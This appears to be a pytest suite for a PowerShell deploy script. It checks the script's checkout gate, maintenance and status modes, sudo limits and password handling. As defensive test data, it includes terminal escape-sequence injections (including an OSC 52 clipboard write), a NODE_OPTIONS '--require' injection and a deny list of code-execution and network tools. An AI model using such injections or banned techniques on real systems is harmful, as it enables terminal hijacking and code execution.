function global:ssh { Write-Output ([char]27 + '[2J' + 'HOV_PHASE=stage'); $global:LASTEXITCODE = 5 }
$ErrorActionPreference = 'Stop'
$lines = Invoke-RemoteScript -Script 'irrelevant'
"RESULT:${LASTEXITCODE}:" + ($lines -join '|')
""",
            check=True,
        )
        assert "RESULT:5:?[2JHOV_PHASE=stage" in proc.stdout, repr(proc.stdout)

    @pytest.mark.parametrize("answer, ok, detail", [
        ("[pscustomobject]@{ StatusCode = 200; Content = '<!DOCTYPE html><html>app</html>' }", False, "body is not JSON"),
        ("[pscustomobject]@{ StatusCode = 200; Content = 'null' }", False, "unexpected body"),
        ("[pscustomobject]@{ StatusCode = 200; Content = '{\"name\":\"x' + [char]27 + '[2J\"}' }", False, "unexpected body"),
        ("[pscustomobject]@{ StatusCode = 503; Content = '' }", False, "HTTP 503"),
        ("throw ('refused' + [char]27 + ']52;c;x' + [char]7)", False, "request failed: refused?]52;c;x?"),
        ("[pscustomobject]@{ StatusCode = 200; Content = '{\"name\":\"Heart of Virtue API\"}' }", True, "HTTP 200"),
    ], ids=["spa-fallback", "json-null", "wrong-name", "http-error", "exception", "the-api"])
    def test_the_public_gate_itself(self, answer, ok, detail):
        proc = _pwsh(
            DOT_SOURCE
            + f"function Invoke-Public {{ param($Url, $TimeoutSec) {answer} }}\n"
            + "$ErrorActionPreference = 'Stop'\n"
            + "Get-PublicApiStatus | ConvertTo-Json -Compress\n",
            check=True,
        )
        result = json.loads(proc.stdout)
        assert result["Ok"] is ok and detail in result["Detail"], result
        assert "\x1b" not in result["Detail"] and "\x07" not in result["Detail"], result

    @pytest.mark.parametrize("answer, found, problem", [
        ("[pscustomobject]@{ StatusCode = 200; Content = 'x data-hov-maintenance x' }", True, None),
        ("[pscustomobject]@{ StatusCode = 200; Content = 'the app' }", False, None),
        ("[pscustomobject]@{ StatusCode = 502; Content = '' }", False, "HTTP 502"),
        ("throw ('timeout' + [char]27 + '[2J')", False, "timeout?[2J"),
    ], ids=["found", "absent", "http-error", "exception"])
    def test_the_public_index_probe_itself(self, answer, found, problem):
        proc = _pwsh(
            DOT_SOURCE
            + f"function Invoke-Public {{ param($Url, $TimeoutSec) {answer} }}\n"
            + "Find-InPublicIndex -Needle 'data-hov-maintenance' -Attempts 1 | ConvertTo-Json -Compress\n",
            check=True,
        )
        assert json.loads(proc.stdout) == {"Found": found, "Problem": problem}

    def test_get_marker_is_exact(self):
        proc = _pwsh(
            DOT_SOURCE
            + r"""
$lines = @('HOV_A=1', 'hov_a=2', 'HOV_A=1', 'X HOV_B=3', 'HOV_B=4', 'HOV_C=5', 'HOV_C=6')
# 3>$null silences the conflicting-values warning; the value is what is checked.
[ordered]@{
    a = Get-Marker -Lines $lines -Name 'HOV_A' 3>$null
    b = Get-Marker -Lines $lines -Name 'HOV_B' 3>$null
    c = Get-Marker -Lines $lines -Name 'HOV_C' 3>$null
    d = Get-Marker -Lines $lines -Name 'HOV_D' 3>$null
} | ConvertTo-Json
""",
            check=True,
        )
        # Case-sensitive, whole-line; a repeat of one value is fine, two
        # values are neither.
        assert json.loads(proc.stdout) == {"a": "1", "b": "4", "c": None, "d": None}


# ── the checkout gate ────────────────────────────────────────────────────────

CLEAN_TREE_STUBS = (
    "function Get-UnpinnedFiles { return ,[string[]]@() }\n"
    "function Get-UnpinnedEnvironment { return ,[string[]]@() }\n"
)


def _run_gate(call, stubs=CLEAN_TREE_STUBS):
    """``call`` after ``stubs``: 'RESULT:ok:<value>' or 'RESULT:threw:<message>'."""
    proc = _pwsh(
        DOT_SOURCE + stubs
        + f'try {{ "RESULT:ok:$({call})" }} catch {{ "RESULT:threw:$($_.Exception.Message)" }}\n',
        check=True,
    )
    return proc.stdout


def _git(repo, *args):
    """Real git in a scratch repository, isolated from the developer's own:
    no inherited GIT_* (a hook exports ones naming the real repository), no
    system or global config, no hooks, no signing."""
    empty_config = repo.parent / f"{repo.name}-empty-gitconfig"
    empty_config.touch()
    subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "core.autocrlf=false",
         "-c", "core.hooksPath=", "-c", "commit.gpgsign=false", *args],
        cwd=repo, check=True, capture_output=True, stdin=subprocess.DEVNULL, timeout=60,
        env=_sandbox_env({"GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": str(empty_config)}),
    )


def _write(repo, relative, text="x\n"):
    path = repo / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


@pytest.fixture
def scratch_repo(tmp_path):
    """A committed repository holding a copy of the script and a frontend."""
    shutil.copy(DEPLOY_PS1, tmp_path / "deploy.ps1")
    _write(tmp_path, "VERSION", "0.0.0.0\n")
    _write(tmp_path, ".gitignore", "archive/\n.env.*\n!.env.production\n")
    for relative in ("frontend/src/main.js", "frontend/src/util.js", "frontend/public/tracked.txt", "frontend/.env.production"):
        _write(tmp_path, relative)
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "add", "-A")
    _git(tmp_path, "commit", "-q", "-m", "init")
    return tmp_path


def _unpinned(repo):
    """Get-UnpinnedFiles and the gate's verdict, from real git in ``repo``."""
    proc = _pwsh(
        f". {_ps_literal((repo / 'deploy.ps1').as_posix())}\n"
        + "function Get-UnpinnedEnvironment { return ,[string[]]@() }\n"
        + "$found = Get-UnpinnedFiles\n"
        + "try { Assert-NothingUnpinned; $gate = 'passed' } catch { $gate = 'refused' }\n"
        + "@{ found = [string[]]@($found); gate = $gate } | ConvertTo-Json -Compress\n",
        check=True,
    )
    result = json.loads(proc.stdout)
    return result["found"], result["gate"]


@pytest.mark.usefixtures("pwsh")
class TestTheCheckoutGate:
    """Refuse unless HEAD == origin/master and nothing outside HEAD can reach
    the bundle."""

    def _checkout(self, head, origin, unpinned=()):
        stubs = (
            f"function Get-CheckoutState {{ [pscustomobject]@{{ Head = '{head}'; Origin = '{origin}' }} }}\n"
            f"function Get-UnpinnedFiles {{ return ,[string[]]{_ps_lines(unpinned)} }}\n"
            "function Get-UnpinnedEnvironment { return ,[string[]]@() }\n"
        )
        return _run_gate("Assert-CheckoutIsOriginMaster", stubs)

    def test_head_other_than_origin_master_is_refused(self):
        out = self._checkout(FAKE_SHA, PREV_SHA)
        assert "RESULT:threw:" in out and "origin/master" in out, out

    def test_anything_unpinned_is_refused_and_named(self):
        out = self._checkout(FAKE_SHA, FAKE_SHA, ["ignored:   frontend/public/x.mp3"])
        assert "RESULT:threw:" in out and "frontend/public/x.mp3" in out, out

    def test_a_clean_origin_master_checkout_is_the_commit_deployed(self):
        assert f"RESULT:ok:{FAKE_SHA}" in self._checkout(FAKE_SHA, FAKE_SHA)

    def test_head_moving_during_the_build_stops_the_upload(self):
        out = _run_gate(f"Assert-BuiltFrom -Sha '{FAKE_SHA}'", CLEAN_TREE_STUBS + f"function Get-HeadSha {{ '{PREV_SHA}' }}\n")
        assert "RESULT:threw:HEAD moved" in out, out

    def test_something_unpinned_appearing_during_the_build_stops_the_upload(self):
        stubs = (
            f"function Get-HeadSha {{ '{FAKE_SHA}' }}\n"
            "function Get-UnpinnedFiles { return ,[string[]]@('untracked: frontend/src/generated.js') }\n"
            "function Get-UnpinnedEnvironment { return ,[string[]]@() }\n"
        )
        out = _run_gate(f"Assert-BuiltFrom -Sha '{FAKE_SHA}'", stubs)
        assert "RESULT:threw:" in out and "frontend/src/generated.js" in out, out

    def test_a_clean_scratch_repo_passes(self, scratch_repo):
        assert _unpinned(scratch_repo) == ([], "passed")

    def test_a_single_ignored_file_is_refused(self, scratch_repo):
        # One file is its own case: a single-element result is where an array
        # that quietly unwraps to a scalar -- or to nothing -- would wave the
        # deploy through.
        _write(scratch_repo, "frontend/public/archive/old.mp3")
        found, gate = _unpinned(scratch_repo)
        assert gate == "refused", found
        assert found == ["ignored:   frontend/public/archive/old.mp3"], found

    def test_every_kind_is_named_and_nothing_else_is(self, scratch_repo):
        _write(scratch_repo, "frontend/public/archive/old.mp3")             # ignored, ships
        _write(scratch_repo, "frontend/src/main.js", "changed\n")           # modified
        _write(scratch_repo, "frontend/public/tracked.txt", "changed\n")    # modified, then hidden:
        _git(scratch_repo, "update-index", "--skip-worktree", "frontend/public/tracked.txt")
        _git(scratch_repo, "update-index", "--assume-unchanged", "frontend/src/util.js")
        _write(scratch_repo, "frontend/src/new.js")                         # untracked
        _write(scratch_repo, "frontend/.env.production.local")              # ignored, read by vite build
        _write(scratch_repo, "frontend/.env.development")                   # ignored, dev only
        _write(scratch_repo, "notes.txt")                                   # untracked, outside frontend/
        found, gate = _unpinned(scratch_repo)
        assert gate == "refused", found
        # `S` / lowercase are ls-files -v's skip-worktree / assume-unchanged tags.
        assert sorted(found) == sorted([
            "tracked:    M frontend/src/main.js",
            "hidden:    S frontend/public/tracked.txt",
            "hidden:    h frontend/src/util.js",
            "untracked: frontend/src/new.js",
            "ignored:   frontend/.env.production.local",
            "ignored:   frontend/public/archive/old.mp3",
        ]), found

    def test_origin_master_is_the_remote_tracking_ref_not_a_lookalike(self, scratch_repo):
        _write(scratch_repo, "frontend/src/main.js", "second\n")
        _git(scratch_repo, "commit", "-q", "-am", "second")
        _git(scratch_repo, "update-ref", "refs/remotes/origin/master", "HEAD~1")
        # A local branch named origin/master would win the short name.
        _git(scratch_repo, "branch", "origin/master", "HEAD")
        proc = _pwsh(
            f". {_ps_literal((scratch_repo / 'deploy.ps1').as_posix())}\n"
            + "$s = Get-CheckoutState -NoFetch\n"
            + "if ($s.Head -ne $s.Origin) { 'RESULT:refused' } else { 'RESULT:passed' }\n",
            check=True,
        )
        assert "RESULT:refused" in proc.stdout, proc.stdout + proc.stderr

    def test_build_variables_in_the_environment_are_refused(self):
        proc = _pwsh(
            DOT_SOURCE
            + r"""
function Get-UnpinnedFiles { return ,[string[]]@() }
$env:NODE_ENV = 'production'
$clean = Get-UnpinnedEnvironment
$env:VITE_API_URL = 'http://localhost:5000'
$env:NODE_ENV = 'Production'
$env:NODE_OPTIONS = '--require ./x.js'
$dirty = Get-UnpinnedEnvironment
try { Assert-NothingUnpinned; $gate = 'passed' } catch { $gate = 'refused' }
@{ clean = $clean; dirty = $dirty; gate = $gate } | ConvertTo-Json -Compress
""",
            check=True,
        )
        result = json.loads(proc.stdout)
        assert result["clean"] == []
        # `Production` is not `production` to Vite or React.
        assert sorted(result["dirty"]) == ["environment: NODE_ENV", "environment: NODE_OPTIONS", "environment: VITE_API_URL"]
        assert result["gate"] == "refused"


# ── the other modes ──────────────────────────────────────────────────────────


def _run_script(*arguments, script=SCRIPT_COPY, env=None):
    return _pwsh(
        f"& {_ps_literal(script.as_posix())} " + " ".join(arguments) + "\nexit $LASTEXITCODE\n",
        env=env,
    )


@pytest.mark.usefixtures("pwsh")
class TestTheDryRun:
    """A dry run's audience is whoever does NOT hold the deploy credential.
    Run on the copy (no .env beside it), with GIT_DIR so it can read HEAD."""

    def _dry_run(self, *arguments):
        return _run_script("-DryRun", *arguments, env={"GIT_DIR": GIT_DIR})

    def test_it_needs_no_env_file_even_where_sshpass_would_use_one(self):
        # The sandbox defines sshpass, so a Main that read the env file before
        # the dry-run branch would throw on the absent one.
        proc = self._dry_run()
        output = proc.stdout + proc.stderr
        assert proc.returncode == 0, output
        assert "DRY RUN" in output and "git reset -q --hard" in output, output
        assert 'echo "HOV_MAINTENANCE=OFF"' in output, output

    def test_it_never_reads_or_prints_the_password(self, tmp_path):
        sentinel = "hov-sentinel-password-7f3a"
        (SCRIPT_COPY_DIR / ".env").write_text(f"NEXUS_PASS={sentinel}\n", encoding="utf-8")
        try:
            env_file = tmp_path / ".env"
            env_file.write_text(f"NEXUS_PASS={sentinel}\n", encoding="utf-8")
            proc = self._dry_run("-EnvFile", _ps_literal(env_file))
        finally:
            (SCRIPT_COPY_DIR / ".env").unlink()
        assert proc.returncode == 0, proc.stdout + proc.stderr
        assert sentinel not in proc.stdout + proc.stderr

    def test_a_version_file_that_is_not_a_tag_is_refused(self, tmp_path):
        # PowerShell validates parameters, not their DEFAULT values: a VERSION
        # file holding a colon or a path would otherwise name the tarball scp
        # uploads.
        shutil.copy(DEPLOY_PS1, tmp_path / "deploy.ps1")
        (tmp_path / "VERSION").write_text("0.2:/../x\n", encoding="utf-8")
        proc = _run_script("-DryRun", script=tmp_path / "deploy.ps1")
        assert proc.returncode == 1, proc.stdout + proc.stderr
        assert "is not a version tag" in proc.stdout + proc.stderr

    def test_keep_maintenance_prints_the_kept_ssh_2(self):
        proc = self._dry_run("-KeepMaintenance")
        output = proc.stdout + proc.stderr
        assert proc.returncode == 0, output
        assert 'echo "HOV_MAINTENANCE=KEPT"' in output and 'echo "HOV_MAINTENANCE=OFF"' not in output, output
        assert re.search(r"cp \S+/index\.html\.parked \S+/preview-[0-9a-f]{32}\.html'", output), output
        assert "Would not lift" in output and LIFT in output, output

    @pytest.mark.parametrize("arguments, refusal", [
        (("-DryRun", "-Status"), "-DryRun applies to the deploy only"),
        (("-Status", "-Maintenance", "On"), "Pick one of -Status or -Maintenance"),
        (("-KeepMaintenance", "-Status"), "-KeepMaintenance applies to the deploy only"),
        (("-KeepMaintenance", "-Maintenance", "Off"), "-KeepMaintenance applies to the deploy only"),
        (("-SavesReset", "-Status"), "-SavesReset picks the page a raise puts up"),
        (("-SavesReset", "-Maintenance", "Off"), "-SavesReset picks the page a raise puts up"),
    ])
    def test_it_refuses_modes_that_do_not_combine(self, arguments, refusal):
        proc = _run_script(*arguments)
        assert proc.returncode == 1 and refusal in proc.stdout + proc.stderr, proc.stdout + proc.stderr


@pytest.mark.usefixtures("pwsh")
class TestTheMaintenanceMode:
    HARNESS = r"""
function Send-ToServer { param($RelativePath, $Destination) Write-Host "CALL:upload:$RelativePath" }
function Invoke-RemoteScript {
    param($Script)
    $phase = if ($Script -cmatch 'HOV_PHASE=([\w-]+)') { $Matches[1] } else { 'unknown' }
    Write-Host "CALL:$phase"
    $global:LASTEXITCODE = $global:RemoteExit
}
"""

    def _mode(self, setting, remote_exit=0, script=SCRIPT_COPY, prelude="", arguments=""):
        proc = _pwsh(
            _dot_source(script).rstrip("\n") + (" " + arguments if arguments else "") + "\n" + self.HARNESS
            + f"$global:RemoteExit = {remote_exit}\n"
            + prelude
            + f'try {{ Invoke-MaintenanceMode -Setting {setting}; "RESULT:ok" }} catch {{ "RESULT:threw:$($_.Exception.Message)" }}\n',
            check=True,
        )
        return re.findall(r"^CALL:(\S+)", proc.stdout, re.M), proc.stdout

    def test_on_uploads_this_checkout_s_page_then_raises_it(self):
        calls, out = self._mode("On")
        assert calls == ["upload:frontend/public/maintenance.html", "maintenance-on"], out
        assert "RESULT:ok" in out, out

    def test_saves_reset_uploads_the_saves_reset_page(self):
        calls, out = self._mode("On", arguments="-SavesReset")
        assert calls == ["upload:frontend/public/maintenance-saves-reset.html", "maintenance-on"], out
        assert "RESULT:ok" in out, out

    def test_on_renders_before_it_uploads(self):
        # A raise that will not render leaves nothing on the server.
        calls, out = self._mode("On", prelude="$RemoteValues['CONTAINER'] = \"webserver`r\"\n")
        assert calls == [] and "RESULT:threw:" in out, out

    @pytest.mark.parametrize("setting, phase", [("On", "maintenance-on"), ("Off", "maintenance-off")])
    def test_a_failed_remote_step_is_not_reported_done(self, setting, phase):
        calls, out = self._mode(setting, remote_exit=1)
        assert phase in calls and "RESULT:threw:" in out, out

    def test_on_refuses_a_file_that_is_not_the_page(self, tmp_path):
        shutil.copy(DEPLOY_PS1, tmp_path / "deploy.ps1")
        shutil.copy(VERSION_FILE, tmp_path / "VERSION")
        _write(tmp_path, "frontend/public/maintenance.html", "<html>not the page</html>\n")
        calls, out = self._mode("On", script=tmp_path / "deploy.ps1")
        assert calls == [] and "it is not the maintenance page" in out, out


@pytest.mark.usefixtures("pwsh")
class TestTheStatusMode:
    """-Status is where every stuck deploy's help sends the operator, so each
    section has to run even when an earlier one failed."""

    def _status(self, *, fetch_fails=False, server_exit=0, server_sha=PREV_SHA, live_commit=PREV_SHA,
                unlifted="no", found=False, index_problem=None, drift=(1, 2), preview="NONE"):
        server_lines = [
            "HOV_PHASE=status",
            f"HOV_STATUS_BACKEND_SHA={server_sha}",
            f"HOV_STATUS_LIVE_COMMIT={live_commit}",
            f"HOV_STATUS_DEPLOYED_CHUNK={BUILT_CHUNK}",
            f"HOV_STATUS_UNLIFTED_PROMOTE={unlifted}",
            f"HOV_STATUS_PREVIEW={preview}",
        ]
        ahead, behind = drift
        problem = _ps_literal(index_problem) if index_problem else "$null"
        proc = _pwsh(
            DOT_SOURCE
            + f"""
function Get-CheckoutState {{
    param([switch]$NoFetch)
    if (-not $NoFetch -and {_ps_bool(fetch_fails)}) {{ throw 'fetch failed: no network' }}
    [pscustomobject]@{{ Head = '{FAKE_SHA}'; Origin = '{FAKE_SHA}' }}
}}
function Invoke-RemoteScript {{
    param($Script)
    Write-Host 'CALL:server'
    $global:LASTEXITCODE = {server_exit}
    return ,[string[]]{_ps_lines(server_lines if server_exit == 0 else [])}
}}
function Invoke-Git {{
    param([string[]]$Arguments)
    if (($Arguments -join ' ') -ceq 'rev-list --left-right --count {server_sha}...{FAKE_SHA}') {{ return ,[string[]]@("{ahead}`t{behind}") }}
    throw "unexpected git call: $Arguments"
}}
function Get-PublicApiStatus {{ Write-Host 'CALL:api'; [pscustomobject]@{{ Ok = $true; Detail = 'stub' }} }}
function Find-InPublicIndex {{
    param($Needle, $Attempts, $DelaySeconds, $TimeoutSec)
    Write-Host "CALL:index:${{Needle}}:$Attempts"
    [pscustomobject]@{{ Found = {_ps_bool(found)}; Problem = {problem} }}
}}
try {{ Invoke-StatusMode; 'RESULT:ok' }} catch {{ "RESULT:threw:$_" }}
""",
            check=True,
        )
        return proc.stdout + proc.stderr

    def test_a_failed_fetch_falls_back_to_the_last_fetched_origin(self):
        out = self._status(fetch_fails=True)
        assert "comparing against the last fetched copy" in out and "RESULT:ok" in out, out

    def test_an_unreachable_server_still_runs_the_public_checks_then_fails(self):
        out = self._status(server_exit=SSH_CONNECTION_LOST)
        _assert_in_order(out, "CALL:server", "CALL:api", "CALL:index", "RESULT:threw:Status query failed")

    def test_drift_counts_both_directions(self):
        # rev-list --left-right --count server...origin: left = ahead, right = behind.
        assert "is 2 commit(s) behind and 1 ahead of origin/master" in self._status(drift=(1, 2))

    def test_an_unusable_server_commit_is_said_not_skipped(self):
        assert "Backend: server commit unknown (NONE)" in self._status(server_sha="NONE")

    @pytest.mark.parametrize("live, expected", [
        (PREV_SHA, "Frontend and backend on the same commit: yes"),
        (OTHER_SHA, "Frontend and backend on the same commit: NO"),
        ("NONE", "Frontend commit: NONE"),
    ])
    def test_it_says_whether_frontend_and_backend_match(self, live, expected):
        assert expected in self._status(live_commit=live)

    def test_it_warns_about_an_unlifted_promote(self):
        out = self._status(unlifted="yes")
        assert "promoted its build and stopped before the lift" in out and "Private preview" not in out, out

    def test_it_names_a_kept_deploy_s_preview_url(self):
        # The operator who lost the URL finds it here.
        out = self._status(unlifted="yes", preview=PREVIEW_NAME)
        assert f"Private preview: {PUBLIC_BASE}/{PREVIEW_NAME}" in out, out
        assert "-KeepMaintenance deploy is behind the page" in out and "stopped before the lift" not in out, out

    def test_a_preview_name_it_would_not_have_made_is_not_offered_as_a_url(self):
        out = self._status(unlifted="yes", preview="preview-x.html")
        assert "Private preview" not in out and "would not have named: preview-x.html" in out, out

    @pytest.mark.parametrize("kwargs, shows", [
        ({}, "app document"),
        ({"found": True}, "MAINTENANCE PAGE"),
        ({"index_problem": "The request timed out"}, "unreachable (The request timed out)"),
    ], ids=["app", "page", "unreachable"])
    def test_it_says_what_the_public_index_is(self, kwargs, shows):
        out = self._status(**kwargs)
        assert "CALL:index:data-hov-maintenance:1" in out, out
        assert shows in out, out
        if shows != "app document":
            assert "app document" not in out, out


@pytest.mark.usefixtures("pwsh")
def test_the_runbook_s_emergency_commands_are_the_ones_the_script_prints():
    # The runbook is what the operator reads with the page up; the script's
    # help is what it prints. Two copies of an emergency command drift.
    named = _pwsh(DOT_SOURCE + f"Write-StuckHelp -State Promoted -RollbackSha '{PREV_SHA}'\n", check=True)
    unnamed = _pwsh(DOT_SOURCE + "Write-StuckHelp -State Promoted -RollbackNote 'x'\n", check=True)
    printed = {
        "backend": [line.strip().replace(PREV_SHA, "<ROLLBACK_SHA>") for line in named.stdout.splitlines() if line.startswith("    cd ")],
        "frontend": [line.strip() for line in named.stdout.splitlines() if line.startswith("    docker exec ")],
        "reflog": [line.strip() for line in unnamed.stdout.splitlines() if line.startswith("    git -C ")],
    }
    runbook = RUNBOOK.read_text(encoding="utf-8")
    for kind, lines in printed.items():
        assert len(lines) == 1, f"Write-StuckHelp should print one {kind} command; got {lines}"
        assert lines[0] in runbook, f"docs/development/deployment.md does not carry the {kind} command:\n{lines[0]}"


#: What the deploy account may run under sudo: the server's sudoers, read with
#: `sudo -l` as alex (2026-09-19). alex's password is LOCKED (`passwd -S`
#: reports L), so any other sudo command prompts for a password nothing can
#: supply -- a dead end for the operator with the page up. sudoers matches the
#: whole argv, so these are exact commands, not prefixes.
DEPLOY_ACCOUNT_SUDO = {f"systemctl restart {SERVICE}", f"systemctl status {SERVICE}"}
_SUDO_COMMAND = re.compile(r"\bsudo\s+([^;&|}`\n]+)")
#: The runbook's commands: fenced blocks and code spans, not its prose.
_MARKDOWN_CODE = re.compile(r"```.*?```|`[^`\n]+`", re.S)


@pytest.mark.usefixtures("pwsh")
def test_every_sudo_command_is_one_the_deploy_account_may_run(rendered):
    # Every state, with and without a rollback commit: all the help it prints.
    help_text = _pwsh(
        DOT_SOURCE
        + "foreach ($state in $DeployStates) {\n"
        + f"    Write-StuckHelp -State $state -RollbackSha '{PREV_SHA}'\n"
        + "    Write-StuckHelp -State $state -RollbackNote 'no rollback commit'\n"
        + "}\n",
        check=True,
    ).stdout
    sources = {phase: rendered[phase] for phase in PHASES}
    sources["the stuck help"] = help_text
    sources["the runbook"] = "\n".join(_MARKDOWN_CODE.findall(RUNBOOK.read_text(encoding="utf-8")))
    seen = collections.defaultdict(set)
    for source, text in sources.items():
        for command in _SUDO_COMMAND.findall(text):
            seen[source].add(command.strip())
    for source in ("stage", "the stuck help", "the runbook"):
        assert f"systemctl restart {SERVICE}" in seen[source], f"no sudo restart found in {source}: the scan is blind"
    for source, commands in seen.items():
        refused = commands - DEPLOY_ACCOUNT_SUDO
        assert not refused, f"{source} has `sudo {sorted(refused)[0]}`, which asks for alex's locked password"


# ── the script's own contract ────────────────────────────────────────────────


def test_version_defaults_to_the_version_file(rendered):
    assert rendered["version"] == VERSION_FILE.read_text(encoding="utf-8").strip()


#: Floors proving the AST walk saw the script body, not exact counts.
MIN_TOP_LEVEL_FUNCTIONS = 10
MIN_TOP_LEVEL_ASSIGNMENTS = 10


def test_nothing_runs_on_dot_source(pwsh):
    # The tests dot-source the file to reach its functions; anything at top
    # level other than definitions and plain values would run then too. The
    # param block's defaults do run: they may read VERSION and build a path.
    proc = _pwsh(
        rf"""
$errors = $null
$ast = [System.Management.Automation.Language.Parser]::ParseFile({_ps_literal(DEPLOY_PS1)}, [ref]$null, [ref]$errors)
function Measure-Runs($node) {{
    [pscustomobject]@{{
        commands = @($node.FindAll({{ param($n) $n -is [System.Management.Automation.Language.CommandAst] }}, $false) | ForEach-Object {{ $_.GetCommandName() }})
        static   = @($node.FindAll({{ param($n) $n -is [System.Management.Automation.Language.InvokeMemberExpressionAst] -and $n.Static }}, $false)).Count
    }}
}}
$statements = foreach ($s in $ast.EndBlock.Statements) {{
    $runs = Measure-Runs $s
    [pscustomobject]@{{
        kind = $s.GetType().Name; text = $s.Extent.Text.Split("`n")[0].Trim()
        commands = $runs.commands; static = $runs.static
        clauses = if ($s -is [System.Management.Automation.Language.IfStatementAst]) {{ $s.Clauses.Count }} else {{ 0 }}
        hasElse = if ($s -is [System.Management.Automation.Language.IfStatementAst]) {{ $null -ne $s.ElseClause }} else {{ $false }}
    }}
}}
$defaults = foreach ($p in $ast.ParamBlock.Parameters) {{ if ($p.DefaultValue) {{ Measure-Runs $p.DefaultValue }} }}
@{{
    errors = @($errors | ForEach-Object {{ "$($_.Extent.StartLineNumber): $($_.Message)" }})
    statements = @($statements); defaults = @($defaults)
}} | ConvertTo-Json -Depth 5
""",
        check=True,
    )
    parsed = json.loads(proc.stdout)
    assert parsed["errors"] == [], f"deploy.ps1 does not parse: {parsed['errors']}"
    statements = parsed["statements"]
    kinds = [s["kind"] for s in statements]
    assert kinds.count("FunctionDefinitionAst") >= MIN_TOP_LEVEL_FUNCTIONS, kinds
    assert kinds.count("AssignmentStatementAst") >= MIN_TOP_LEVEL_ASSIGNMENTS, kinds
    for statement in statements:
        if statement["kind"] == "AssignmentStatementAst":
            assert not statement["commands"] and statement["static"] == 0, f"runs at top level: {statement['text']}"
        else:
            assert statement["kind"] in {"FunctionDefinitionAst", "IfStatementAst"}, statement
    guards = [s for s in statements if s["kind"] == "IfStatementAst"]
    # `-ne '.'`, not `-notin '.', '&'`: `& .\deploy.ps1` is a run, not a
    # dot-source. One clause, no else: nothing else may run on dot-source.
    assert [(g["text"], g["clauses"], g["hasElse"]) for g in guards] == [
        ("if ($MyInvocation.InvocationName -ne '.') {", 1, False)
    ], guards
    for default in parsed["defaults"]:
        assert set(default["commands"] or []) <= {"Get-Content", "Join-Path"} and default["static"] == 0, default


class TestTheScriptText:
    """Guards that need no interpreter."""

    def test_every_remote_script_is_a_phase_renderer_s_output(self, script_text):
        # Expand-Template's guards -- the CRLF normalisation among them -- hold
        # only for a script that went through it, and the all-phase tests only
        # see the renderers PHASE_RENDERERS lists.
        renderers = set(re.findall(r"^function (New-\w+Script)\b", script_text, re.M))
        assert renderers == {call.split()[0] for call in PHASE_RENDERERS.values()}
        assert len(re.findall(r"-Exe 'ssh'", script_text)) == 1, "ssh is reached other than through Invoke-RemoteScript"
        uses = re.findall(r"(?<!function )Invoke-RemoteScript\b(.{0,9})", script_text)
        assert uses and all(use == " -Script " for use in uses), uses
        for argument in re.findall(r"Invoke-RemoteScript -Script (\S+)", script_text):
            if argument.startswith("$"):
                sources = re.findall(rf"^\s*{re.escape(argument)} = (\S+)", script_text, re.M)
            else:
                sources = [argument.strip("()")]
            assert sources and all(source in renderers for source in sources), (argument, sources)

    @pytest.fixture(scope="class")
    def param_block(self, script_text):
        start = script_text.index("param (")
        return script_text[start:script_text.index("\n)\n", start) + 1]

    @pytest.fixture(scope="class")
    def code(self, script_text):
        """The script minus comment-based help and whole-line comments.

        Only whole lines: cutting at any `#` would also cut inside strings
        and drop the code after them, which loosens every negative guard
        below rather than tightening it.
        """
        no_help = re.sub(r"<#.*?#>", "", script_text, flags=re.S)
        return "\n".join(line for line in no_help.splitlines() if not line.lstrip().startswith("#"))

    def test_the_modes_are_declared_in_the_param_block(self, param_block):
        assert re.search(r"\[switch\]\s*\$Status\b", param_block), "deploy.ps1 param(): no [switch]$Status"
        assert re.search(r"\[switch\]\s*\$DryRun\b", param_block), "deploy.ps1 param(): no [switch]$DryRun"
        assert re.search(r"\[switch\]\s*\$KeepMaintenance\b", param_block), "deploy.ps1 param(): no [switch]$KeepMaintenance"
        assert re.search(r"\[switch\]\s*\$SavesReset\b", param_block), "deploy.ps1 param(): no [switch]$SavesReset"
        assert re.search(r"ValidateSet\(\s*'On'\s*,\s*'Off'\s*\)\]\s*\[string\]\s*\$Maintenance\b", param_block), (
            "deploy.ps1 param(): -Maintenance lost ValidateSet('On','Off')"
        )

    def test_version_is_optional_and_validated_by_one_rule(self, param_block, script_text):
        assert "[string]$Version" in param_block and "Mandatory = $true" not in param_block
        declared = re.search(r"\[ValidatePattern\('([^']+)'\)\]\s*\[string\]\$Version", param_block)
        rechecked = re.search(r"if \(\$Version -cnotmatch '([^']+)'\)", script_text)
        assert declared and rechecked, "the version rule is no longer declared and rechecked"
        # Main re-checks the default (PowerShell does not validate defaults):
        # the two literals must be the same rule.
        assert declared.group(1) == rechecked.group(1)

    def test_the_password_reaches_sshpass_only_through_its_environment(self, code):
        # Every line of code that names the password -- under either name, in
        # any case -- is allow-listed. A new use of any shape, an argument, a
        # log line, an $env: read outside the one call, is a line this list
        # does not know.
        allowed = (
            r"\$script:NexusPass = if \(Get-Command sshpass -ErrorAction SilentlyContinue\) "
            r"\{ Get-NexusPass -Path \$EnvFile \} else \{ \$null \}",
            r"\$useSshpass = \$script:NexusPass -and \(Get-Command sshpass -ErrorAction SilentlyContinue\)",
            r"if \(\$useSshpass\) \{",
            r"\$program = 'sshpass'",
            r"if \(\$useSshpass\) \{ \$env:SSHPASS = \$script:NexusPass \}",
            r"if \(\$useSshpass\) \{ Remove-Item Env:SSHPASS -ErrorAction SilentlyContinue \}",
        )
        # Get-NexusPass's own body (the lines naming the NEXUS_PASS key) is
        # held by TestTheNexusPassFile, which checks no message quotes it.
        uses = [
            line.strip() for line in code.splitlines()
            if re.search(r"nexus_?pass|sshpass", line, re.I)
            and not re.match(r"\s*function Get-NexusPass\b", line)
            and "NEXUS_PASS" not in line
        ]
        assert len(uses) == len(allowed), uses
        for pattern in allowed:
            assert any(re.fullmatch(pattern, use) for use in uses), (pattern, uses)
        assert "$argv = @('-e', $Exe) + $argv" in code
        assert re.search(r"[\"']-p|sshpass\s+-p\b", code) is None

    def test_nothing_reaches_a_tool_around_the_sandbox(self, code):
        # The sandbox shadows tools by name. These are the ways around a
        # name, and none of them belongs in a deploy script.
        forbidden = (
            r"Invoke-Expression|\biex\b", r"Start-Process", r"Diagnostics\.Process", r"\b(Set|New)-Alias\b",
            r"Start-(Thread)?Job|-Parallel\b", r"\b(New-PSSession|Invoke-Command|Enter-PSSession)\b",
            r"WebClient|HttpClient|Net\.Sockets", r"Invoke-RestMethod|\birm\b",
